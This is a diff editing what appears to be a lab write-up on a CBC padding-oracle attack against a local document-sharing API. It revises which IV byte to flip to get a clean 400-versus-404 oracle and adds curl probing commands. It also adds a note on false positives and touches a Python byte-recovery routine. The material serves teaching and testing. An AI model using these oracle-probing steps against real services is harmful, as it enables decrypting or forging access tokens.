@@ -88,19 +88,21 @@ Decryption failed. Bad padding.
 
 ### Flipping a byte in the IV
 
-Now modify a hex character in the first 32 characters (the IV):
+For a single block the IV is the previous block: each IV byte XORs into exactly one plaintext byte. To keep valid padding while still corrupting the content, flip a byte that lands inside the resource id (`ORD-004`), not the `order` type name and not the last byte (which carries the padding). Here we change a byte in the middle of the IV:
 
 ```bash
-# Change the first hex digit
-MODIFIED="0${TOKEN:1}"
+# Change a hex digit mapping to the resource id (leaves "order:" and the padding intact)
+MODIFIED="${TOKEN:0:12}0${TOKEN:13}"
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$MODIFIED"
 ```
 
 Response: **404** — `{"error": "Shared resource not found"}`
 
-Changing the IV doesn't break padding (padding depends on the ciphertext block), but it corrupts the decrypted plaintext. So the server got valid padding, tried to look up the garbled resource path, found nothing, and returned 404.
+The padding byte is untouched, so decryption succeeds, but the plaintext now reads `order:<garbage>`. The server parsed a valid type, looked up a resource that doesn't exist, and returned 404.
 
-There's our oracle: **400 = bad padding, 404 = valid padding**.
+Two traps to avoid when probing: flipping the _last_ IV byte corrupts the padding itself → 400, and flipping a byte in the `order` type name makes the type unknown → 400 `Unsupported resource type`. Only a byte inside the id gives a clean 404.
+
+There's our oracle: a **400** means the padding was rejected, while any **non-400** response (404 here) means the padding was valid and the server simply couldn't route the plaintext. The attack needs exactly that one bit.
 
 ## Understanding the vulnerability
 
@@ -158,6 +160,8 @@ When attacking the last byte, a guess might produce valid padding like `\x02\x02
 2. If the server now returns 400, the original result was a false positive (the padding was `\x02\x02`, not `\x01`)
 3. Skip this guess and move on
 
+One more subtlety: the 400-vs-non-400 signal isn't perfectly clean. A decryption that produces valid padding but whose plaintext happens to contain a `:` followed by an unknown type also returns 400 (`Unsupported resource type`). Since `intermediate = plaintext XOR IV` is effectively random per token, there's roughly a 6% chance (`1 - (255/256)^16`) that the block's intermediate value contains a `:` (`0x3a`), in which case the highest byte can't be recovered and the script bails out. If that happens, just generate a fresh share token and run it again.
+
 ## Exploitation
 
 ### Step 1: Generate a valid share token
@@ -178,8 +182,8 @@ curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/shar
 FLIP_CT="${TOKEN:0:63}$(printf '%x' $(( (0x${TOKEN:63:1} + 1) % 16 )))"
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$FLIP_CT"
 
-# Flip first IV byte — should return 404 (valid padding, wrong resource)
-FLIP_IV="$(printf '%x' $(( (0x${TOKEN:0:1} + 1) % 16 )))${TOKEN:1}"
+# Flip a byte inside the resource id — should return 404 (valid padding, wrong resource)
+FLIP_IV="${TOKEN:0:12}$(printf '%x' $(( (0x${TOKEN:12:1} + 1) % 16 )))${TOKEN:13}"
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/api/documents/share?token=$FLIP_IV"
 ```
 
@@ -245,7 +249,6 @@ def recover_intermediate(cipher_block: bytes) -> bytearray:
                         continue
 
                 intermediate[byte_pos] = guess ^ padding_value
-                plaintext_byte = intermediate[byte_pos] ^ 0  # XOR with 0 (test IV)
                 print(
                     f"  [+] Byte {byte_pos:2d}: "
                     f"intermediate=0x{intermediate[byte_pos]:02x} "
